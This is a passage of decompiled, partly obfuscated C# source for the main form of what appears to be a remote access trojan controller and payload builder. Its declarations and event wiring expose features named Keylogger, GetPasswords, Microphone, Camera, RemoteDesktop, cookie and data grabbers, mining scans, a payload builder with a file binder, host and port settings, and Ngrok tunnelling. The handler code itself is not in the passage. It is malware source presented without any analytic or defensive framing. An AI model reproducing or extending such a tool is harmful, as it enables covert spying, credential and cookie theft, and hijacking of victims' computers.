	[AccessedThroughProperty("PictureBox88")]
	[CompilerGenerated]
	public PictureBox pictureBox_84;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel43")]
	public Panel zrnniJxxmQ;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel44")]
	public Panel panel_41;

	[AccessedThroughProperty("Mining_Scan")]
	[CompilerGenerated]
	public Guna2Button guna2Button_18;

	[AccessedThroughProperty("Label95")]
	[CompilerGenerated]
	public Label label_89;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox89")]
	public PictureBox pictureBox_85;

	[AccessedThroughProperty("Panel45")]
	[CompilerGenerated]
	public Panel panel_42;

	[AccessedThroughProperty("Mining_len")]
	[CompilerGenerated]
	public Guna2Button guna2Button_19;

	[AccessedThroughProperty("Label96")]
	[CompilerGenerated]
	public Label jVlnoMaKpm;

	[AccessedThroughProperty("PictureBox90")]
	[CompilerGenerated]
	public PictureBox pictureBox_86;

	[AccessedThroughProperty("Label97")]
	[CompilerGenerated]
	public Label label_90;

	[AccessedThroughProperty("Guna2CircleProgressBar3")]
	[CompilerGenerated]
	public Guna2CircleProgressBar guna2CircleProgressBar_4;

	[AccessedThroughProperty("PictureBox91")]
	[CompilerGenerated]
	public PictureBox pictureBox_87;

	[AccessedThroughProperty("Panel46")]
	[CompilerGenerated]
	public Panel panel_43;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel47")]
	public Panel panel_44;

	[AccessedThroughProperty("Grabber_Scan")]
	[CompilerGenerated]
	public Guna2Button guna2Button_20;

	[AccessedThroughProperty("Label98")]
	[CompilerGenerated]
	public Label label_91;

	[AccessedThroughProperty("PictureBox92")]
	[CompilerGenerated]
	public PictureBox pictureBox_88;

	[AccessedThroughProperty("Panel48")]
	[CompilerGenerated]
	public Panel panel_45;

	[AccessedThroughProperty("Grabber_len")]
	[CompilerGenerated]
	public Guna2Button guna2Button_21;

	[CompilerGenerated]
	[AccessedThroughProperty("Label99")]
	public Label label_92;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox93")]
	public PictureBox pictureBox_89;

	[AccessedThroughProperty("Label100")]
	[CompilerGenerated]
	public Label label_93;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2CircleProgressBar4")]
	public Guna2CircleProgressBar guna2CircleProgressBar_5;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox94")]
	public PictureBox pictureBox_90;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel49")]
	public Panel panel_46;

	[AccessedThroughProperty("Panel50")]
	[CompilerGenerated]
	public Panel panel_47;

	[AccessedThroughProperty("Cookies_scan")]
	[CompilerGenerated]
	public Guna2Button guna2Button_22;

	[AccessedThroughProperty("Label101")]
	[CompilerGenerated]
	public Label label_94;

	[AccessedThroughProperty("PictureBox95")]
	[CompilerGenerated]
	public PictureBox pictureBox_91;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel51")]
	public Panel panel_48;

	[AccessedThroughProperty("Cookies_len")]
	[CompilerGenerated]
	public Guna2Button guna2Button_23;

	[AccessedThroughProperty("Label102")]
	[CompilerGenerated]
	public Label label_95;

	[AccessedThroughProperty("PictureBox96")]
	[CompilerGenerated]
	public PictureBox pictureBox_92;

	[AccessedThroughProperty("Label103")]
	[CompilerGenerated]
	public Label label_96;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2CircleProgressBar5")]
	public Guna2CircleProgressBar guna2CircleProgressBar_6;

	[AccessedThroughProperty("PictureBox97")]
	[CompilerGenerated]
	public PictureBox pictureBox_93;

	[CompilerGenerated]
	[AccessedThroughProperty("Box1")]
	public RichTextBox richTextBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("pnlNav")]
	public Panel panel_49;

	[AccessedThroughProperty("Box2")]
	[CompilerGenerated]
	public RichTextBox richTextBox_1;

	[AccessedThroughProperty("Panel26")]
	[CompilerGenerated]
	public Panel panel_50;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox18")]
	public PictureBox pictureBox_94;

	[AccessedThroughProperty("Label38")]
	[CompilerGenerated]
	public Label label_97;

	[AccessedThroughProperty("PictureBox98")]
	[CompilerGenerated]
	public PictureBox pictureBox_95;

	[AccessedThroughProperty("Button12")]
	[CompilerGenerated]
	public Button button_16;

	[AccessedThroughProperty("Button11")]
	[CompilerGenerated]
	public Button button_17;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer5")]
	public System.Windows.Forms.Timer timer_4;

	[CompilerGenerated]
	[AccessedThroughProperty("Timer6")]
	public System.Windows.Forms.Timer timer_5;

	[CompilerGenerated]
	[AccessedThroughProperty("RichTextBox2")]
	public RichTextBox richTextBox_2;

	[AccessedThroughProperty("RichTextBox1")]
	[CompilerGenerated]
	public RichTextBox richTextBox_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2ComboBox1")]
	public Guna2ComboBox guna2ComboBox_6;

	[CompilerGenerated]
	[AccessedThroughProperty("LEVEL")]
	public Guna2RatingStar guna2RatingStar_0;

	public string string_0;

	public string string_1;

	public int int_0;

	public bool isActive;

	public int port;

	public SK S;

	public int PPP;

	public string string_2;

	public string client1;

	public string coded400;

	public Client sk;

	public static string List_Anti;

	public string string_3;

	public Random rand;

	public int int_1;

	public string string_4;

	public string REC;

	public string Nresource;

	public string V;

	public byte[] Binder_Byte;

	public string Binder_name;

	public static string numx;

	public static string Pas_user;

	public static string Pas_os;
    public Exception obj;

    internal virtual ToolStripMenuItem ManagerToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_0;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_0 = value;
		}
	}

	internal virtual ToolStripMenuItem RunFileToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_63;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_1 = value;
			toolStripMenuItem = toolStripMenuItem_1;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem FromLinkToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_17;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_2 = value;
			toolStripMenuItem = toolStripMenuItem_2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem FromDiskToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_3;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_16;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_3 = value;
			toolStripMenuItem = toolStripMenuItem_3;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ScriptToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_4;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_7;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_4;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_4 = value;
			toolStripMenuItem = toolStripMenuItem_4;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem RemoteDesktopToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_5;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_5 = value;
		}
	}

	internal virtual ToolStripMenuItem MicrophoneToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_6;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_9;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_6 = value;
			toolStripMenuItem = toolStripMenuItem_6;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem GetPasswordsToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_7;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_7 = value;
		}
	}

	internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_8;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_8 = value;
			toolStripMenuItem = toolStripMenuItem_8;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem OpenChatToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_9;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_3;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_9 = value;
			toolStripMenuItem = toolStripMenuItem_9;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ServerToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_10;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_62;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_10 = value;
			toolStripMenuItem = toolStripMenuItem_10;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_11;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_11;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_11 = value;
			toolStripMenuItem = toolStripMenuItem_11;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual NotifyIcon NotifyIcon1
	{
		[CompilerGenerated]
		get
		{
			return notifyIcon_0;
		}
		[CompilerGenerated]
		set
		{
			MouseEventHandler value2 = method_10;
			NotifyIcon notifyIcon = notifyIcon_0;
			if (notifyIcon != null)
			{
				notifyIcon.MouseDoubleClick -= value2;
			}
			notifyIcon_0 = value;
			notifyIcon = notifyIcon_0;
			if (notifyIcon != null)
			{
				notifyIcon.MouseDoubleClick += value2;
			}
		}
	}

	internal virtual ContextMenuStrip ContextMenuStrip2
	{
		[CompilerGenerated]
		get
		{
			return contextMenuStrip_0;
		}
		[CompilerGenerated]
		set
		{
			contextMenuStrip_0 = value;
		}
	}

	internal virtual ToolStripMenuItem RestartToolStripMenuItem1
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_12;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_12;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_12 = value;
			toolStripMenuItem = toolStripMenuItem_12;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ExitToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_13;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_13;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_13;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_13 = value;
			toolStripMenuItem = toolStripMenuItem_13;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual Guna2Panel P1
	{
		[CompilerGenerated]
		get
		{
			return guna2Panel_0;
		}
		[CompilerGenerated]
		set
		{
			guna2Panel_0 = value;
		}
	}

	public virtual Panel panel8
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2ControlBox_0 = value;
		}
	}

	public virtual Panel Panel6
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	public virtual Panel panel9
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	public virtual Label label16
	{
		[CompilerGenerated]
		get
		{
			return IdpsByboqX;
		}
		[CompilerGenerated]
		set
		{
			IdpsByboqX = value;
		}
	}

	internal virtual TabControl TabControl1
	{
		[CompilerGenerated]
		get
		{
			return tabControl_0;
		}
		[CompilerGenerated]
		set
		{
			tabControl_0 = value;
		}
	}

	internal virtual TabPage A
	{
		[CompilerGenerated]
		get
		{
			return tabPage_0;
		}
		[CompilerGenerated]
		set
		{
			tabPage_0 = value;
		}
	}

	internal virtual TabPage B
	{
		[CompilerGenerated]
		get
		{
			return tabPage_1;
		}
		[CompilerGenerated]
		set
		{
			tabPage_1 = value;
		}
	}

	internal virtual TabPage D
	{
		[CompilerGenerated]
		get
		{
			return tabPage_2;
		}
		[CompilerGenerated]
		set
		{
			tabPage_2 = value;
		}
	}

	public virtual Panel panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_3;
		}
		[CompilerGenerated]
		set
		{
			panel_3 = value;
		}
	}

	public virtual Button Settings6
	{
		[CompilerGenerated]
		get
		{
			return button_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_29;
			EventHandler value3 = method_30;
			Button button = button_0;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_0 = value;
			button = button_0;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button Toolbox5
	{
		[CompilerGenerated]
		get
		{
			return button_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_31;
			EventHandler value3 = method_32;
			Button button = button_1;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_1 = value;
			button = button_1;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button About
	{
		[CompilerGenerated]
		get
		{
			return button_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_33;
			EventHandler value3 = method_34;
			Button button = button_2;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_2 = value;
			button = button_2;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button Logis4
	{
		[CompilerGenerated]
		get
		{
			return button_3;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_27;
			EventHandler value3 = method_28;
			Button button = button_3;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_3 = value;
			button = button_3;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button Builder3
	{
		[CompilerGenerated]
		get
		{
			return button_4;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_25;
			EventHandler value3 = method_26;
			Button button = button_4;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_4 = value;
			button = button_4;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button Client2
	{
		[CompilerGenerated]
		get
		{
			return button_5;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_23;
			EventHandler value3 = method_24;
			Button button = button_5;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_5 = value;
			button = button_5;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Button Home1
	{
		[CompilerGenerated]
		get
		{
			return button_6;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_21;
			EventHandler value3 = method_22;
			Button button = button_6;
			if (button != null)
			{
				button.Click -= value2;
				button.Leave -= value3;
			}
			button_6 = value;
			button = button_6;
			if (button != null)
			{
				button.Click += value2;
				button.Leave += value3;
			}
		}
	}

	public virtual Panel panel2
	{
		[CompilerGenerated]
		get
		{
			return panel_4;
		}
		[CompilerGenerated]
		set
		{
			panel_4 = value;
		}
	}

	public virtual PictureBox pictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Panel Panel7
	{
		[CompilerGenerated]
		get
		{
			return panel_5;
		}
		[CompilerGenerated]
		set
		{
			panel_5 = value;
		}
	}

	internal virtual TabPage C
	{
		[CompilerGenerated]
		get
		{
			return tabPage_3;
		}
		[CompilerGenerated]
		set
		{
			tabPage_3 = value;
		}
	}

	internal virtual Guna2RadioButton D5
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_0;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_0 = value;
		}
	}

	internal virtual Guna2RadioButton D1
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_1;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_1 = value;
		}
	}

	internal virtual Guna2TextBox Name_Folder
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_0 = value;
		}
	}

	internal virtual Guna2RadioButton D7
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_2;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_2 = value;
		}
	}

	internal virtual Guna2RadioButton D3
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_3;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_3 = value;
		}
	}

	internal virtual Guna2TextBox Name_Payload
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_1;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_1 = value;
		}
	}

	internal virtual Guna2TextBox Ports
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_2;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_2 = value;
		}
	}

	internal virtual Guna2TextBox NameClient
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_3;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_3 = value;
		}
	}

	internal virtual Guna2TextBox host
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_4;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_4 = value;
		}
	}

	internal virtual L1 L1
	{
		[CompilerGenerated]
		get
		{
			return l1_0;
		}
		[CompilerGenerated]
		set
		{
			DataGridViewColumnEventHandler value2 = method_35;
			L1 l = l1_0;
			if (l != null)
			{
				l.ColumnWidthChanged -= value2;
			}
			l1_0 = value;
			l = l1_0;
			if (l != null)
			{
				l.ColumnWidthChanged += value2;
			}
		}
	}

	internal virtual Pp1 Pp1
	{
		[CompilerGenerated]
		get
		{
			return pp1_0;
		}
		[CompilerGenerated]
		set
		{
			pp1_0 = value;
		}
	}

	public virtual Label Label26
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	public virtual Panel Panel14
	{
		[CompilerGenerated]
		get
		{
			return panel_6;
		}
		[CompilerGenerated]
		set
		{
			panel_6 = value;
		}
	}

	public virtual Label Label23
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual Guna2CircleProgressBar Guna2CircleProgressBar1
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_0;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_0 = value;
		}
	}

	public virtual PictureBox PictureBox6
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	internal virtual ListView ListView1
	{
		[CompilerGenerated]
		get
		{
			return listView_0;
		}
		[CompilerGenerated]
		set
		{
			listView_0 = value;
		}
	}

	public virtual Panel Panel18
	{
		[CompilerGenerated]
		get
		{
			return panel_7;
		}
		[CompilerGenerated]
		set
		{
			panel_7 = value;
		}
	}

	internal virtual Guna2Button Label3
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_0;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_0 = value;
		}
	}

	public virtual PictureBox PictureBox10
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	public virtual Label Label29
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Panel Panel17
	{
		[CompilerGenerated]
		get
		{
			return panel_8;
		}
		[CompilerGenerated]
		set
		{
			panel_8 = value;
		}
	}

	internal virtual Guna2Button Onl
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_1;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_1 = value;
		}
	}

	public virtual PictureBox PictureBox9
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_3 = value;
		}
	}

	public virtual Label Label20
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Panel Panel16
	{
		[CompilerGenerated]
		get
		{
			return panel_9;
		}
		[CompilerGenerated]
		set
		{
			panel_9 = value;
		}
	}

	internal virtual Guna2Button Sel
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_2;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_2 = value;
		}
	}

	public virtual PictureBox PictureBox7
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_4 = value;
		}
	}

	public virtual Panel Panel19
	{
		[CompilerGenerated]
		get
		{
			return panel_10;
		}
		[CompilerGenerated]
		set
		{
			panel_10 = value;
		}
	}

	internal virtual Guna2Button UP
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_3;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_3 = value;
		}
	}

	public virtual PictureBox PictureBox11
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_5;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_5 = value;
		}
	}

	public virtual Label Label30
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual Panel Panel20
	{
		[CompilerGenerated]
		get
		{
			return panel_11;
		}
		[CompilerGenerated]
		set
		{
			panel_11 = value;
		}
	}

	internal virtual Guna2Button Winxp
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_4;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_4 = value;
		}
	}

	public virtual PictureBox PictureBox12
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_6;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_6 = value;
		}
	}

	public virtual Label Label31
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	public virtual Panel Panel21
	{
		[CompilerGenerated]
		get
		{
			return panel_12;
		}
		[CompilerGenerated]
		set
		{
			panel_12 = value;
		}
	}

	internal virtual Guna2Button Win10
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_5;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_5 = value;
		}
	}

	public virtual PictureBox PictureBox8
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_7;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_7 = value;
		}
	}

	public virtual Label Label27
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	public virtual Panel Panel22
	{
		[CompilerGenerated]
		get
		{
			return panel_13;
		}
		[CompilerGenerated]
		set
		{
			panel_13 = value;
		}
	}

	internal virtual Guna2Button Win8
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_6;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_6 = value;
		}
	}

	public virtual PictureBox PictureBox13
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_8;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_8 = value;
		}
	}

	public virtual Label Label28
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	public virtual Panel Panel15
	{
		[CompilerGenerated]
		get
		{
			return panel_14;
		}
		[CompilerGenerated]
		set
		{
			panel_14 = value;
		}
	}

	internal virtual Guna2Button Win7
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_7;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_7 = value;
		}
	}

	public virtual PictureBox PictureBox5
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_9;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_9 = value;
		}
	}

	public virtual Label Label25
	{
		[CompilerGenerated]
		get
		{
			return label_8;
		}
		[CompilerGenerated]
		set
		{
			label_8 = value;
		}
	}

	public virtual Panel Panel12
	{
		[CompilerGenerated]
		get
		{
			return panel_15;
		}
		[CompilerGenerated]
		set
		{
			panel_15 = value;
		}
	}

	internal virtual Guna2Button Guna2Button7
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_8;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_8 = value;
		}
	}

	public virtual Label Label19
	{
		[CompilerGenerated]
		get
		{
			return label_9;
		}
		[CompilerGenerated]
		set
		{
			label_9 = value;
		}
	}

	public virtual PictureBox PictureBox16
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_10;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_10 = value;
		}
	}

	public virtual Panel Panel10
	{
		[CompilerGenerated]
		get
		{
			return panel_16;
		}
		[CompilerGenerated]
		set
		{
			panel_16 = value;
		}
	}

	internal virtual Guna2Button SCANN
	{
		[CompilerGenerated]
		get
		{
			return guna2Button_9;
		}
		[CompilerGenerated]
		set
		{
			guna2Button_9 = value;
		}
	}

	public virtual Label Label11
	{
		[CompilerGenerated]
		get
		{
			return label_10;
		}
		[CompilerGenerated]
		set
		{
			label_10 = value;
		}
	}

	public virtual PictureBox PictureBox14
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_11;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_11 = value;
		}
	}

	internal virtual ToolStripMenuItem DesktopToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_14;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_38;
			ToolStripMenuItem toolStripMenuItem = toolStripMenuItem_14;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			toolStripMenuItem_14 = value;
			toolStripMenuItem = toolStripMenuItem_14;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem CameraToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return opxXcnMiPX;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = OmyUiVitod;
			ToolStripMenuItem toolStripMenuItem = opxXcnMiPX;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			opxXcnMiPX = value;
			toolStripMenuItem = opxXcnMiPX;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem VirusToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_15;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_15 = value;
		}
	}

	internal virtual ToolStripMenuItem NgrokToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return toolStripMenuItem_16;
		}
		[CompilerGenerated]
		set
		{
			toolStripMenuItem_16 = value;
		}
	}

	internal virtual Guna2TextBox TextBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_5;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_39;
			KeyPressEventHandler value3 = method_40;
			EventHandler value4 = method_134;
			Guna2TextBox guna2TextBox = guna2TextBox_5;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconLeftClick -= value2;
				guna2TextBox.KeyPress -= value3;
				guna2TextBox.TextChanged -= value4;
			}
			guna2TextBox_5 = value;
			guna2TextBox = guna2TextBox_5;
			if (guna2TextBox != null)
			{
				guna2TextBox.IconLeftClick += value2;
				guna2TextBox.KeyPress += value3;
				guna2TextBox.TextChanged += value4;
			}
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_11;
		}
		[CompilerGenerated]
		set
		{
			label_11 = value;
		}
	}

